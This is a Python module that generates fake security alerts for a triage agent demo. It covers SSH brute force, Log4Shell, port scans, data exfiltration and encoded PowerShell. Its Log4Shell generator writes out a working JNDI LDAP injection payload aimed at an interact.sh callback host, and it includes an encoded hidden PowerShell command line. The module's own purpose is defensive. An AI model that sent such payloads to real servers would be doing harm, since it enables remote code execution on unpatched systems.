"""Synthetic alert generators.

Each function fabricates a plausible raw log line plus enough metadata for
the agent's tools (`enrich_ip`, `lookup_cve`, `get_log_context`) to have
something consistent to riff on. Randomized per call so repeated demo runs
don't look identical.
"""

import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Callable

from app.alerts.models import Alert, AlertType

_USERNAMES = ["root", "admin", "deploy", "jsmith", "svc_backup", "postgres"]
_HOSTNAMES = ["web-prod-01", "db-prod-03", "app-worker-07", "vpn-gateway-02", "finance-ws-14"]
_EXTERNAL_IP_POOL = [
    "185.220.101.47",
    "45.155.204.19",
    "103.90.224.12",
    "194.61.24.108",
    "91.240.118.33",
]
_INTERNAL_SUBNET = "10.42.{}.{}"


def _random_internal_ip() -> str:
    return _INTERNAL_SUBNET.format(random.randint(1, 20), random.randint(2, 254))


def _random_external_ip() -> str:
    return random.choice(_EXTERNAL_IP_POOL)


def _timestamp(minutes_ago: int = 0) -> str:
    ts = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
    return ts.strftime("%Y-%m-%dT%H:%M:%SZ")


def _new_id() -> str:
    return f"alert-{uuid.uuid4().hex[:10]}"


def generate_ssh_brute_force() -> Alert:
    ip = _random_external_ip()
    host = random.choice(_HOSTNAMES)
    user = random.choice(_USERNAMES)
    attempts = random.randint(40, 250)
    log_lines = "\n".join(
        f"{_timestamp(minutes_ago=attempts - i)} {host} sshd[{1000 + i}]: "
        f"Failed password for {user} from {ip} port {random.randint(1024, 65000)} ssh2"
        for i in range(min(attempts, 6))
    )
    log_lines += f"\n... ({attempts} total failed attempts in the last {attempts} minutes) ..."
    log_lines += f"\n{_timestamp()} {host} sshd[9999]: Accepted password for {user} from {ip} port 51422 ssh2"

    return Alert(
        id=_new_id(),
        type=AlertType.SSH_BRUTE_FORCE,
        title=f"SSH brute force against {host}, followed by successful login",
        source_ip=ip,
        raw_log=log_lines,
        metadata={"target_host": host, "target_user": user, "attempt_count": attempts},
    )


def generate_log4shell() -> Alert:
    ip = _random_external_ip()
    host = random.choice(_HOSTNAMES)
    callback_domain = f"{uuid.uuid4().hex[:12]}.interact.sh"
    payload = f"${{jndi:ldap://{callback_domain}/a}}"
    raw_log = (
        f'{_timestamp()} {host} nginx: {ip} - - "GET /api/login HTTP/1.1" 200 512 '
        f'"-" "{payload}"\n'
        f"{_timestamp()} {host} app: WARN JndiLookup class invoked from untrusted "
        f"header value, resolving {callback_domain}"
    )

    return Alert(
        id=_new_id(),
        type=AlertType.LOG4SHELL,
        title=f"Possible Log4Shell (CVE-2021-44228) exploitation attempt against {host}",
        source_ip=ip,
        raw_log=raw_log,
        metadata={"target_host": host, "callback_domain": callback_domain},
    )


def generate_port_scan() -> Alert:
    ip = _random_external_ip()
    host = random.choice(_HOSTNAMES)
    ports = sorted(random.sample(range(1, 65535), k=random.randint(15, 40)))
    window_seconds = random.randint(8, 45)
    log_lines = "\n".join(
        f"{_timestamp()} firewall: DROP TCP {ip}:{random.randint(1024, 65000)} -> "
        f"{host}:{port} SYN"
        for port in ports[:6]
    )
    log_lines += f"\n... ({len(ports)} distinct destination ports probed in ~{window_seconds}s) ..."

    return Alert(
        id=_new_id(),
        type=AlertType.PORT_SCAN,
        title=f"TCP port scan against {host} from a single source",
        source_ip=ip,
        raw_log=log_lines,
        metadata={"target_host": host, "port_count": len(ports), "window_seconds": window_seconds},
    )


def generate_data_exfiltration() -> Alert:
    internal_ip = _random_internal_ip()
    host = random.choice(_HOSTNAMES)
    user = random.choice(_USERNAMES)
    dest_ip = _random_external_ip()
    bytes_out = random.randint(2_000_000_000, 40_000_000_000)
    gb_out = round(bytes_out / 1_000_000_000, 1)
    raw_log = (
        f"{_timestamp()} proxy: {host} ({internal_ip}, user={user}) uploaded "
        f"{bytes_out} bytes to {dest_ip}:443 over a single TLS session "
        f"(baseline for this host is under 200MB/day)\n"
        f"{_timestamp()} dlp: outbound transfer matched pattern 'bulk archive' (.tar.gz, .zip)"
    )

    return Alert(
        id=_new_id(),
        type=AlertType.DATA_EXFILTRATION,
        title=f"Anomalous outbound data transfer from {host} ({gb_out} GB)",
        source_ip=internal_ip,
        raw_log=raw_log,
        metadata={"target_host": host, "user": user, "destination_ip": dest_ip, "bytes_out": bytes_out},
    )


def generate_suspicious_powershell() -> Alert:
    host = random.choice(_HOSTNAMES)
    internal_ip = _random_internal_ip()
    user = random.choice(_USERNAMES)
    encoded_blob = uuid.uuid4().hex.upper() + uuid.uuid4().hex.upper()
    raw_log = (
        f"{_timestamp()} {host} Sysmon: EventID=1 ProcessCreate "
        f'User={user} CommandLine="powershell.exe -NoP -NonI -W Hidden -Enc {encoded_blob}"\n'
        f"{_timestamp()} {host} Sysmon: EventID=3 NetworkConnect "
        f"powershell.exe -> {_random_external_ip()}:443"
    )

    return Alert(
        id=_new_id(),
        type=AlertType.SUSPICIOUS_POWERSHELL,
        title=f"Encoded PowerShell execution with outbound connection on {host}",
        source_ip=internal_ip,
        raw_log=raw_log,
        metadata={"target_host": host, "user": user},
    )


GENERATORS: dict[AlertType, Callable[[], Alert]] = {
    AlertType.SSH_BRUTE_FORCE: generate_ssh_brute_force,
    AlertType.LOG4SHELL: generate_log4shell,
    AlertType.PORT_SCAN: generate_port_scan,
    AlertType.DATA_EXFILTRATION: generate_data_exfiltration,
    AlertType.SUSPICIOUS_POWERSHELL: generate_suspicious_powershell,
}


def generate_alert(alert_type: AlertType) -> Alert:
    return GENERATORS[alert_type]()


def generate_random_alert() -> Alert:
    return generate_alert(random.choice(list(AlertType)))
